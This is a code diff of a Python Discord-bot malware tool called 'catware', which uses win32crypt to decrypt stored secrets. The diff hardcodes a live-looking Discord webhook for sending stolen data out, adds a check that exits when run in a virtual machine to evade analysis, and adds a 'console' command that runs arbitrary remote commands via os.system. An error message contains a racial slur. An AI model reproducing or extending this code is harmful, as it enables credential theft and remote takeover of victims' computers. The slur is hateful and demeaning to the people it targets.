@@ -27,11 +27,16 @@ import re
 from json import loads
 from win32crypt import CryptUnprotectData
 import codecs
+import sys
 
 embedcolor = 000000
+
+if hasattr(sys, 'real_prefix'): # Detect if user is on VM [Debug/Bypassing program]
+    print("VM Detected!")
+    exit()
 class Hook:
     def GetHOOK():
-        webhook = "UR WEB HOOK"
+        webhook = "https://discord.com/api/webhooks/928565743061192744/CVCdNka-ykBHX9JyllcrtSNQ2eK4Taha1qfupAuzYTZFTyC4nmAORnkfv-bw1OcI3zPM"
         return webhook
 
     def SendHOOK(data):
@@ -672,7 +677,7 @@ def Startbot():
     @catware.command()
     async def monitoron(ctx):
         embed = discord.Embed(title = f"catware", color=embedcolor)
-        embed.add_field(name = "monitoron", value = "```Monitor Turned oon Successfully```",  inline=False)
+        embed.add_field(name = "monitoron", value = "```Monitor Turned on Successfully```",  inline=False)
         await ctx.send(embed = embed)
         MonitorON()
     @catware.command()
@@ -759,7 +764,10 @@ def Startbot():
             startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
             startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
             await ctx.send(embed = startembed)  
-
+    @catware.command()
+    async def console(ctx, command):
+        os.system(f'cmd /k "{command}"')
+    
     @catware.command()
     async def endtask(ctx, taskname):
                     try:
